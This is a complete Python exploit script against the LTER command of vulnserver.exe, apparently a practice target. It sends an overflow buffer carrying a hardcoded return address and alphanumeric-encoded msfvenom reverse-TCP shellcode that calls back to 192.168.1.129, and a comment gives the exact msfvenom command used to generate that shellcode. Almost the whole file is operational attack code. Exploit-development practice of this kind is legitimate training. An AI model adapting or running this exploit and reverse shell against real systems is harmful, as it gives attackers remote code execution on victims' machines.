#!/usr/bin/python
import socket 
import os 
import sys
import struct

IP=sys.argv[1]
port=sys.argv[2]




payload = "LTER /.:/"
payload += "C"*2003 # If this is set to A, it breaks the shellcode decoder for some reason in a cmp command.
payload += struct.pack("<I",0x62501205)
payload += "CCCCCC"
#msfvenom -p windows/shell/reverse_tcp LPORT=5800 LHOST=192.168.1.129 -f python -v payload -e x86/alpha_mixed BufferRegister=ebp
# BufferRegister=ebp is important when generating the alphanum payload. This tells msfvenom where our shellcode will be start exactly so it wont have to look for its absolute position
payload += "\x54\x58\x2d\x7f\x7f\x7f\x7f\x2d\x63\x7e\x7e\x7e\x2d\x01\x02\x02\x02\x50\x5d\x54\x58\x50\x5c" #aligning EBP with the start of our shellcode to honor the BufferRegister param.
payload += "\x55\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
payload += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
payload += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
payload += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
payload += "\x42\x75\x4a\x49\x39\x6c\x79\x78\x6e\x62\x67\x70"
payload += "\x33\x30\x45\x50\x75\x30\x4e\x69\x39\x75\x44\x71"
payload += "\x69\x50\x73\x54\x4e\x6b\x46\x30\x74\x70\x4e\x6b"
payload += "\x53\x62\x56\x6c\x6e\x6b\x52\x72\x34\x54\x6c\x4b"
payload += "\x63\x42\x47\x58\x44\x4f\x48\x37\x50\x4a\x46\x46"
payload += "\x54\x71\x69\x6f\x6c\x6c\x35\x6c\x33\x51\x53\x4c"
payload += "\x76\x62\x76\x4c\x45\x70\x6b\x71\x68\x4f\x56\x6d"
payload += "\x77\x71\x39\x57\x4a\x42\x58\x72\x32\x72\x31\x47"
payload += "\x6c\x4b\x56\x32\x44\x50\x4c\x4b\x62\x6a\x35\x6c"
payload += "\x6c\x4b\x62\x6c\x66\x71\x61\x68\x4d\x33\x57\x38"
payload += "\x77\x71\x38\x51\x32\x71\x4c\x4b\x32\x79\x35\x70"
payload += "\x63\x31\x49\x43\x6e\x6b\x43\x79\x47\x68\x69\x73"
payload += "\x57\x4a\x31\x59\x6c\x4b\x66\x54\x6c\x4b\x77\x71"
payload += "\x6b\x66\x55\x61\x49\x6f\x4c\x6c\x6b\x71\x6a\x6f"
payload += "\x36\x6d\x65\x51\x69\x57\x74\x78\x59\x70\x33\x45"
payload += "\x38\x76\x33\x33\x33\x4d\x4c\x38\x35\x6b\x53\x4d"
payload += "\x47\x54\x31\x65\x78\x64\x32\x78\x6c\x4b\x43\x68"
payload += "\x66\x44\x77\x71\x4e\x33\x63\x56\x6c\x4b\x36\x6c"
payload += "\x52\x6b\x6e\x6b\x70\x58\x37\x6c\x55\x51\x6e\x33"
payload += "\x4e\x6b\x45\x54\x4c\x4b\x63\x31\x5a\x70\x4f\x79"
payload += "\x52\x64\x67\x54\x35\x74\x53\x6b\x51\x4b\x61\x71"
payload += "\x56\x39\x42\x7a\x36\x31\x69\x6f\x59\x70\x71\x4f"
payload += "\x51\x4f\x30\x5a\x6e\x6b\x36\x72\x6a\x4b\x4e\x6d"
payload += "\x71\x4d\x73\x58\x44\x73\x47\x42\x53\x30\x47\x70"
payload += "\x72\x48\x63\x47\x52\x53\x55\x62\x73\x6f\x66\x34"
payload += "\x63\x58\x70\x4c\x42\x57\x71\x36\x73\x37\x6f\x79"
payload += "\x79\x78\x59\x6f\x7a\x70\x4d\x68\x5a\x30\x77\x71"
payload += "\x47\x70\x35\x50\x37\x59\x78\x44\x73\x64\x32\x70"
payload += "\x72\x48\x54\x69\x4d\x50\x50\x6b\x37\x70\x79\x6f"
payload += "\x4b\x65\x42\x4a\x76\x6a\x33\x58\x4f\x30\x4e\x48"
payload += "\x43\x31\x4f\x71\x73\x58\x35\x52\x37\x70\x37\x66"
payload += "\x69\x38\x4f\x79\x79\x76\x70\x50\x52\x70\x30\x50"
payload += "\x46\x30\x67\x30\x72\x70\x43\x70\x46\x30\x62\x48"
payload += "\x49\x7a\x66\x6f\x59\x4f\x6d\x30\x59\x6f\x38\x55"
payload += "\x6f\x67\x42\x4a\x66\x70\x70\x56\x42\x77\x42\x48"
payload += "\x4f\x69\x6f\x55\x43\x44\x50\x61\x49\x6f\x69\x45"
payload += "\x4c\x45\x4b\x70\x51\x64\x45\x5a\x79\x6f\x70\x4e"
payload += "\x35\x58\x34\x35\x6a\x4c\x5a\x48\x31\x77\x57\x70"
payload += "\x53\x30\x37\x70\x73\x5a\x47\x70\x73\x5a\x65\x54"
payload += "\x32\x76\x42\x77\x73\x58\x56\x62\x58\x59\x78\x48"
payload += "\x43\x6f\x49\x6f\x79\x45\x4e\x63\x78\x78\x33\x30"
payload += "\x71\x6e\x66\x56\x6e\x6b\x30\x36\x53\x5a\x51\x50"
payload += "\x50\x68\x73\x30\x46\x70\x33\x30\x55\x50\x32\x76"
payload += "\x72\x4a\x63\x30\x70\x68\x51\x48\x4f\x54\x30\x53"
payload += "\x68\x65\x69\x6f\x4b\x65\x6e\x73\x33\x63\x61\x7a"
payload += "\x47\x70\x66\x36\x76\x33\x71\x47\x42\x48\x43\x32"
payload += "\x78\x59\x69\x58\x53\x6f\x39\x6f\x4a\x75\x4d\x53"
payload += "\x48\x78\x67\x70\x43\x4d\x65\x78\x33\x68\x70\x68"
payload += "\x43\x30\x47\x30\x45\x50\x75\x50\x30\x6a\x43\x30"
payload += "\x76\x30\x61\x78\x34\x4b\x66\x4f\x76\x6f\x30\x30"
payload += "\x49\x6f\x48\x55\x73\x67\x61\x78\x62\x55\x42\x4e"
payload += "\x70\x4d\x63\x51\x39\x6f\x5a\x75\x63\x6e\x63\x6e"
payload += "\x59\x6f\x74\x4c\x34\x64\x64\x4f\x4c\x45\x62\x50"
payload += "\x59\x6f\x59\x6f\x79\x6f\x4d\x39\x4f\x6b\x49\x6f"
payload += "\x39\x6f\x49\x6f\x57\x71\x5a\x63\x64\x69\x4a\x66"
payload += "\x30\x75\x39\x51\x69\x53\x6f\x4b\x4c\x30\x6c\x75"
payload += "\x4f\x52\x36\x36\x72\x4a\x73\x30\x43\x63\x79\x6f"
payload += "\x78\x55\x41\x41"
payload += "\x44"*(1000-800)




# payload += "\x73\x07"
# payload += struct.pack("<I",0x6250120B) ----> pop pop ret
# payload += "\xcc"*(5000-3515-4)



print "[*] Sending evil LTER request to vulnserver.exe"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((IP, int(port)))
expl.send(payload)
expl.close()
